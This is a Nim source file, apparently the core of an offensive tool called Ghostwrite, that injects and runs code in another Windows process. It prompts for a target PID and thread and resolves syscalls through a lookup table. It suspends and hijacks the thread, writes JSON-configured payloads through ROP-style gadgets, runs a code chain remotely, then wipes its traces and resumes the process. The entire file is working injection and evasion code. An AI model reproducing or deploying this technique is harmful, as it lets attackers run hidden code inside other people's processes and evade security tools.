#[
    Author: zimawhit3
    Github: https://github.com/zimawhit3
    License: BSD 3-Clause
]#

import Modules/ghostwrite

proc NimMain() {.cdecl, importc.}

proc DllMain*(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: DWORD): BOOL {.stdcall, exportc, dynlib.} =
    result = TRUE
    case fdwReason:
    of DLL_PROCESS_ATTACH:
        NimMain()
        when not defined(zima):
            write(stdout, "[+] Loaded DLL!\n")
    of DLL_PROCESS_DETACH:
        discard
    of DLL_THREAD_ATTACH:
        discard
    of DLL_THREAD_DETACH:
        discard
    else:
        discard

proc Ghostwrite*(TargetProc, TargetThread: int16 = 0, Config: string = "", Io: File = stdout): bool {.nimcall, exportc, dynlib.} =

    NimMain()
    result = true
    var
        WindowObj                           : WindowObject          = WindowObject()
        HGArray                             : array[18, HGEntry]    = newHGArray()
        NewClient                           : CLIENT_ID             = CLIENT_ID()
        SaveContext, ExeContext, StartCtx   : CONTEXT               = CONTEXT(ContextFlags: CONTEXT_ALL)
        Memorys                             : seq[RWMemory]         = newSeq[RWMemory]()
        Gadgets                             : seq[Gadget]           = newSeq[Gadget]()
        Payloads                            : seq[Payload]          = newSeq[Payload]()
        ProcessHandle, ThreadHandle         : HANDLE                = 0
        TargetProcess, TargetThread         : int16                 = 0
        CodeNode                            : JsonNode              = newJArray()
        TargetRip                           : DWORD64
        
    # Initialize HG
    if not HGArray.InitializeHGTable:
        when not defined(zima):
            echo "Failed to initialize hg table"
        result = false
        return
    
    # Set Target Process 
    if TargetProc == 0:

        write(Io, "Enter Process to look for -> ")
        try:
            var
                input : string = readLine(stdin).string
            HGArray.EnumProcesses(input, Io)
        except:
            result = false
            return

        write(Io, "Enter PID to inject into -> ")
        try:
            var 
                input   = readLine(stdin)
            TargetProcess = input.parseInt.int16
        except:
            result = false
            return

        write(Io, "Enter Thread to inject into -> ")
        try:
            var 
                input   = readLine(stdin)
            TargetThread = input.parseInt.int16
        except:
            result = false
            return
    
    # Initialize Structures
    if not InitializeClientID(TargetProcess, TargetThread, &NewClient, &WindowObj, HGArray):
        when not defined(zima):
            red("[-] Failed to initialize Client ID")
        result = false
        return
    when not defined(zima):
        green("[+] Initialized Client ID!")

    if not InitializeHandles(&ProcessHandle, &ThreadHandle, &NewClient, HGArray):
        when not defined(zima):
            red("[-] Failed to initialize Handles")
        result = false
        return
    when not defined(zima):
        green("[+] Initialized Handles!")

    if not InitializeContexts(ThreadHandle, &SaveContext, &ExeContext, &StartCtx, HGArray):
        when not defined(zima):
            red("[-] Failed to Get Contexts")
        result = false
        return
    when not defined(zima):
        green("[+] Initialized Contexts")

    if not InitializeStack(ProcessHandle, ThreadHandle, ExeContext, Memorys, HGArray):
        when not defined(zima):
            red("[-] Failed to initialize stack structure")
        result = false
        return
    when not defined(zima):
        green("[+] Initialized Stack Structure")
    
    # Configure Sequences & Start Context
    try:
        var
            Nodes = parseJson(Config)

        for NodeKey, Node in Nodes.pairs():
            
            case NodeKey:
            of "Memorys":
                when not defined(zima):
                    yellow(fmt"[i] Loading in {NodeKey}")

                for JsonMemory in Node.items():
                    Memorys.LoadMemory(JsonMemory)

            of "Payloads":
                when not defined(zima):
                    yellow(fmt"[i] Loading in {NodeKey}")
                for JsonPayload in Node.items():
                    Payloads.LoadPayload(Memorys, JsonPayload)
                Payloads.InitializePayloads
            
            of "Gadgets":
                when not defined(zima):
                    yellow(fmt"[i] Loading in {NodeKey}")
                
                # Iterator may modify state, need a closure
                let
                    gadgetNodes = gadgetNodes(Node)
                for JsonGadget in gadgetNodes():
                    LoadGadget(ProcessHandle, Gadgets, JsonGadget, HGArray)
                Gadgets.InitializeGadgets

            of "StartContext":
                when not defined(zima):
                    yellow(fmt"[i] Loading in {NodeKey}")
                LoadStartContext(&StartCtx, TargetRip, Gadgets, Memorys, Node)

            of "CodeChain":
                CodeNode = copy(Node)
            
            else:
                red(fmt"[!] Invalid Key: {NodeKey}")
                discard

    except JsonParsingError:
        when not defined(zima):
            red("[-] Malformed JSON. Failed to parse.")
            echo fmt"   [Error] {getCurrentExceptionMsg()}"
        result = false
        return

    except KeyError:
        when not defined(zima):
            red("[-] Missing Key in JSON.")
            echo fmt"   [Error] {getCurrentExceptionMsg()}"
        result = false
        return

    except ValueError:
        when not defined(zima):
            red("[-] Failed object conversion.")
            echo fmt"   [Error] {getCurrentExceptionMsg()}"
        result = false
        return

    except OSError:
        when not defined(zima):
            red("[-] Failed windows syscall")
            echo fmt"   [Error] {getCurrentExceptionMsg()}"
        result = false
        return

    except:
        when not defined(zima):
            red("[-] Unknown error")
            echo fmt"   [Error] {getCurrentExceptionMsg()}"
        result = false
        return
    when not defined(zima):
        green("[+] Successfully loaded sequences!")

    var
        MainWriteGadget : Gadget    = Gadgets.GetMainStore
    let
        SinkAddress     : DWORD64   = Gadgets.GetSink.Address.DWORD64
    
    MainWriteGadget.InitializeWriteGadget(ExeContext)

    # Initialize CodeChain
    try:
        let
            argNodes = argNodes(CodeNode)
        for Arg in argNodes():
            ParseGadgetArg(ProcessHandle, Memorys, Gadgets, Payloads, HGArray, Arg)
        
    except KeyError:
        when not defined(zima):
            echo fmt"[-] Key Error while parsing json : {getCurrentExceptionMsg()}"
        result = false
        return
    
    except ValueError:
        when not defined(zima):
            echo fmt"[-] Value error while parsing json : {getCurrentExceptionMsg()}"
        result = false
        return
    
    except JsonKindError:
        when not defined(zima):
            echo fmt"[-] Json not properly formatted : {getCurrentExceptionMsg()}"
        result = false
        return
    
    except:
        when not defined(zima):
            echo fmt"[-] Unknown error while parsing json : {getCurrentExceptionMsg()}"
        result = false
        return

    when not defined(zima):
        green(fmt"[+] Initialized Code Chain!")
        yellow(fmt"[i] Beggining Injection")
    
    # Ghostwriting!
    if MainWriteGadget.Volatile:
        
        # Suspend the process
        if not SuspendProcess(ProcessHandle, HGArray):
            Exit(ProcessHandle, ThreadHandle, &SaveContext, HGArray)
            result = false
            return

        # Forcefully sinking the thread, since our gadgets use volatile registers, they get clobbered after return from NtGetUserMessage
        if not SinkThread(ThreadHandle, &ExeContext, SinkAddress, WindowObj, HGArray):
            Exit(ProcessHandle, ThreadHandle, &SaveContext, HGArray)
            result = false
            return
    else:

        if not SuspendThread(ThreadHandle, HGArray):
            Exit(ProcessHandle, ThreadHandle, &SaveContext, HGArray)
            result = false
            return

    # Must write sink gadget to stackbase. Sink Gadget acts as a net for us to fall into for consequtive writes
    if not WriteSink(ThreadHandle, Gadgets, Memorys, &ExeContext, HGArray):
        Exit(ProcessHandle, ThreadHandle, &SaveContext, HGArray)
        result = false
        return

    if not WriteMemory(ThreadHandle, Gadgets, Memorys, Payloads, &ExeContext, HGArray):
        Exit(ProcessHandle, ThreadHandle, &SaveContext, HGArray)
        result = false
        return

    if TargetRip == 0:
        when not defined(zima):
            red(fmt"Missing TargetRip!")
        Exit(ProcessHandle, ThreadHandle, &SaveContext, HGArray)
        result = false
        return
    
    if not ExecuteCodeChain(ThreadHandle, TargetRip, &StartCtx, HGArray):
        Exit(ProcessHandle, ThreadHandle, &SaveContext, HGArray)
        result = false
        return
    
    # Re-Write the Sink for Cleaning
    if not WriteSink(ThreadHandle, Gadgets, Memorys, &ExeContext, HGArray):
        Exit(ProcessHandle, ThreadHandle, &SaveContext, HGArray)
        result = false
        return

    if not CleanMemory(ThreadHandle, Gadgets, Memorys, Payloads, &ExeContext, HGArray):
        Exit(ProcessHandle, ThreadHandle, &SaveContext, HGArray)
        result = false
        return
    
    when not defined(zima):
        green(fmt"[+] All done! Resuming Process and Exiting...")

    if not ResumeExecution(ThreadHandle, &SaveContext, HGArray):
        result = false

    if not ResumeProcess(ProcessHandle, HGArray):
        result = false

    Exit(ProcessHandle, ThreadHandle, &SaveContext, HGArray)
